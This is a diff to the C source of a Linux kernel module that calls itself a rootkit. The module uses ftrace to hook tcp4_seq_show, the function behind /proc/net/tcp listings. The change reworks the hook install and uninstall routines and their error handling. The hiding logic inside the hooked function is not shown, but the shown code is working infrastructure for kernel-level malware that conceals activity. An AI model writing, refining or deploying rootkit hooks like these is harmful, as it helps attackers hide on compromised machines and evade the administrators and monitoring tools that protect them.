@@ -62,6 +62,36 @@ asmlinkage static int hooked_tcp4_seq_show(struct seq_file *seq, void *v){
 }
 
 /*
+* Function: uninstall_hook
+* ------------------------
+* remove the ftrace hook
+* return 0 - success. otherwise - error.
+*/
+static int uninstall_hook(struct ftrace_hook *f_hook){
+    printk(KERN_INFO "[+] rootkit uninstalling hook on %s\n", f_hook->name);
+    int err;
+
+    err = unregister_ftrace_function(&f_hook->ops);
+    if(err)
+    {
+        printk(KERN_INFO "[-] rootkit error while unregister_ftrace_function. error code %d\n", err);
+        return err;
+    }
+
+    err = ftrace_set_filter_ip(&f_hook->ops, f_hook->addr, 1, 0);
+    if(err)
+    {
+        printk(KERN_INFO "[-] rootkit error while removing filters. error code %d\n", err);
+        return err;
+    }
+
+    printk(KERN_INFO "[+] rootkit success uninstalling hook on %s\n", f_hook->name);
+    return 0;
+}
+struct ftrace_hook tcp4_show_hook = HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &original_tcp4_seq_show);
+
+
+/*
 * Function: install_hook
 * ----------------------
 * Installing our hook using ftrace
@@ -90,32 +120,12 @@ static int install_hook(struct ftrace_hook *f_hook){
     if (err)
     {
         printk(KERN_INFO "[-] rootkit error registering function %s. err code %d\n", f_hook->name, err);
-        ftrace_set_filter_ip(&f_hook->ops, f_hook->addr, 1, 0);
+        uninstall_hook(f_hook);
+        return err;
     }
     printk(KERN_INFO "[+] rootkit success installing hook on %s\n", f_hook->name);
     return 0;
 }
-
-/*
-* Function: uninstall_hook
-* ------------------------
-* remove the ftrace hook
-* return 0 - success. otherwise - error.
-*/
-static int uninstall_hook(struct ftrace_hook *f_hook){
-    printk(KERN_INFO "[+] rootkit uninstalling hook on %s\n", f_hook->name);
-    int err;
-
-    err = unregister_ftrace_function(&f_hook->ops);
-    if(err)
-    {
-        printk(KERN_INFO "[-] rootkit error whine unregister_ftrace_function. error code %d\n", err);
-        return err;
-    }
-    printk(KERN_INFO "[+] rootkit success uninstalling hook on %s\n", f_hook->name);
-    return 0;
-}
-struct ftrace_hook tcp4_show_hook = HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &original_tcp4_seq_show);
 
 static int __init init_rootkit(void) {
     printk(KERN_INFO "[+] rootkit init_rootkit\n");
